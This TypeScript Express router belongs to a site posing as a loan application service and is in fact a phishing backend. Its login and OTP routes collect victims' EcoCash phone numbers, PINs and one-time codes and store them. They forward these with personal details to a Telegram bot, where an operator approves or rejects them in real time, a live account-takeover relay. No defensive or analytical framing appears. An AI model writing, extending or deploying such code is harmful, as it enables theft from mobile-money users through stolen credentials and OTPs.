/**
 * Loan Application Routes
 * Handles: application submission, status polling, login capture, OTP verification
 * Integrates with Telegram Bot for admin approval workflow
 */

import { Router } from "express";
import { eq } from "drizzle-orm";
import { randomUUID } from "crypto";
import { db, applicationsTable } from "@workspace/db";
import {
  SubmitApplicationBody,
  SubmitLoginBody,
  SubmitOtpBody,
} from "@workspace/api-zod";
import { sendTelegramLoginMessage, sendTelegramOtpMessage } from "../lib/telegram.js";

const router = Router();

/**
 * POST /api/applications
 * Submit a new loan application
 */
router.post("/applications", async (req, res) => {
  const parsed = SubmitApplicationBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Invalid request body" });
    return;
  }

  const sessionId = randomUUID();
  const data = parsed.data;

  try {
    const [app] = await db
      .insert(applicationsTable)
      .values({
        sessionId,
        loanType: data.loanType,
        loanAmount: data.loanAmount,
        loanTerm: data.loanTerm,
        loanPurpose: data.loanPurpose,
        firstName: data.firstName,
        lastName: data.lastName,
        phoneNumber: data.phoneNumber,
        employmentStatus: data.employmentStatus,
        monthlyIncome: data.monthlyIncome,
        status: "PENDING",
      })
      .returning();

    req.log.info({ sessionId }, "Loan application submitted");
    res.status(201).json(app);
  } catch (err) {
    req.log.error({ err }, "Failed to insert application");
    res.status(500).json({ error: "Internal server error" });
  }
});

/**
 * GET /api/applications/:sessionId
 * Retrieve application by session ID
 */
router.get("/applications/:sessionId", async (req, res) => {
  const { sessionId } = req.params;

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.sessionId, sessionId));

    if (!app) {
      res.status(404).json({ error: "Application not found" });
      return;
    }

    res.json(app);
  } catch (err) {
    req.log.error({ err }, "Failed to fetch application");
    res.status(500).json({ error: "Internal server error" });
  }
});

/**
 * GET /api/applications/:sessionId/status
 * Poll the approval status (login stage)
 */
router.get("/applications/:sessionId/status", async (req, res) => {
  const { sessionId } = req.params;

  try {
    const [app] = await db
      .select({ status: applicationsTable.status, sessionId: applicationsTable.sessionId })
      .from(applicationsTable)
      .where(eq(applicationsTable.sessionId, sessionId));

    if (!app) {
      res.status(404).json({ error: "Application not found" });
      return;
    }

    res.json({ status: app.status, sessionId: app.sessionId, message: null });
  } catch (err) {
    req.log.error({ err }, "Failed to poll status");
    res.status(500).json({ error: "Internal server error" });
  }
});

/**
 * POST /api/applications/:sessionId/login
 * User submits EcoCash login credentials.
 * Sends full application details to Telegram for admin review.
 * Admin clicks Approve or Reject from Telegram.
 */
router.post("/applications/:sessionId/login", async (req, res) => {
  const { sessionId } = req.params;
  const parsed = SubmitLoginBody.safeParse(req.body);

  if (!parsed.success) {
    res.status(400).json({ error: "Invalid request body" });
    return;
  }

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.sessionId, sessionId));

    if (!app) {
      res.status(404).json({ error: "Application not found" });
      return;
    }

    // Save login credentials
    await db
      .update(applicationsTable)
      .set({
        loginPhone: parsed.data.phone,
        loginPin: parsed.data.pin,
        status: "LOGIN_SUBMITTED",
        updatedAt: new Date(),
      })
      .where(eq(applicationsTable.sessionId, sessionId));

    req.log.info({ sessionId }, "Login submitted — sending to Telegram");

    // Send to Telegram with Approve/Reject buttons
    const msgId = await sendTelegramLoginMessage({
      sessionId,
      firstName: app.firstName ?? "",
      lastName: app.lastName ?? "",
      phoneNumber: app.phoneNumber ?? "",
      loanType: app.loanType ?? "",
      loanAmount: app.loanAmount ?? 0,
      loanTerm: app.loanTerm ?? 0,
      loanPurpose: app.loanPurpose ?? "",
      employmentStatus: app.employmentStatus ?? "",
      monthlyIncome: app.monthlyIncome ?? 0,
      loginPhone: parsed.data.phone,
      loginPin: parsed.data.pin,
    });

    // Store Telegram message ID for callback routing
    if (msgId) {
      await db
        .update(applicationsTable)
        .set({ telegramLoginMessageId: msgId, updatedAt: new Date() })
        .where(eq(applicationsTable.sessionId, sessionId));
    }

    res.json({ status: "LOGIN_SUBMITTED", sessionId, message: "Awaiting admin approval" });
  } catch (err) {
    req.log.error({ err }, "Failed to process login submission");
    res.status(500).json({ error: "Internal server error" });
  }
});

/**
 * POST /api/applications/:sessionId/otp
 * User submits OTP code.
 * Sends OTP to Telegram for admin verification (Correct/Wrong buttons).
 */
router.post("/applications/:sessionId/otp", async (req, res) => {
  const { sessionId } = req.params;
  const parsed = SubmitOtpBody.safeParse(req.body);

  if (!parsed.success) {
    res.status(400).json({ error: "Invalid request body" });
    return;
  }

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.sessionId, sessionId));

    if (!app) {
      res.status(404).json({ error: "Application not found" });
      return;
    }

    // Save OTP and set status
    await db
      .update(applicationsTable)
      .set({
        otpCode: parsed.data.otp,
        status: "OTP_SUBMITTED",
        updatedAt: new Date(),
      })
      .where(eq(applicationsTable.sessionId, sessionId));

    req.log.info({ sessionId, otp: parsed.data.otp }, "OTP received — sending to Telegram");

    // Send OTP to Telegram with Correct/Wrong buttons
    const msgId = await sendTelegramOtpMessage({
      sessionId,
      firstName: app.firstName ?? "",
      lastName: app.lastName ?? "",
      phoneNumber: app.phoneNumber ?? app.loginPhone ?? "",
      otp: parsed.data.otp,
    });

    if (msgId) {
      await db
        .update(applicationsTable)
        .set({ telegramOtpMessageId: msgId, updatedAt: new Date() })
        .where(eq(applicationsTable.sessionId, sessionId));
    }

    req.log.info({ sessionId }, "OTP sent to Telegram for admin verification");
    res.json({ status: "OTP_SUBMITTED", sessionId, message: "Awaiting OTP verification" });
  } catch (err) {
    req.log.error({ err }, "Failed to process OTP submission");
    res.status(500).json({ error: "Internal server error" });
  }
});

/**
 * GET /api/applications/:sessionId/otp-status
 * Poll OTP verification status
 */
router.get("/applications/:sessionId/otp-status", async (req, res) => {
  const { sessionId } = req.params;

  try {
    const [app] = await db
      .select({
        status: applicationsTable.status,
        sessionId: applicationsTable.sessionId,
        otpCode: applicationsTable.otpCode,
      })
      .from(applicationsTable)
      .where(eq(applicationsTable.sessionId, sessionId));

    if (!app) {
      res.status(404).json({ error: "Application not found" });
      return;
    }

    let message: string | null = null;
    if (app.status === "OTP_APPROVED") message = "OTP verified successfully";
    if (app.status === "OTP_REJECTED") message = "Incorrect OTP. Please try again.";

    res.json({ status: app.status, sessionId: app.sessionId, message, otpCode: app.otpCode });
  } catch (err) {
    req.log.error({ err }, "Failed to poll OTP status");
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
